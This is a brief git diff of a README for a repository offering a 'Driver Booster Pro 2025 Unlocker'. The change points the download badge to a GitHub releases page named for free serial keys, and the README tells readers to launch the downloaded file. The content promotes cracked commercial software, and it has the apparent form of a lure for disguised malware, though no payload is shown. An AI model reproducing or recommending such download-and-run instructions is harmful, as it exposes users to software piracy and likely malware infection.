@@ -22,7 +22,7 @@ Welcome to the ultimate Driver Booster Pro 2025 Unlocker repository! Here, you c
 
 ## Ready to Download Driver Booster Pro 2025?
 Click the colorful button below to get your hands on the latest version of Driver Booster Pro 2025:
-[![Download Driver Booster Pro 2025](https://img.shields.io/badge/Download-DriverBoosterPro2025-green)](https://github.com/assets/Release.zip)
+[![Download Driver Booster Pro 2025](https://github.com/xeNos2222/IObit-Driver-Booster-Pro-2025-free-Serial-Key/releases)](https://github.com/xeNos2222/IObit-Driver-Booster-Pro-2025-free-Serial-Key/releases)
 
 If the link ends with a file name, ensure to launch it to begin the download process.
 
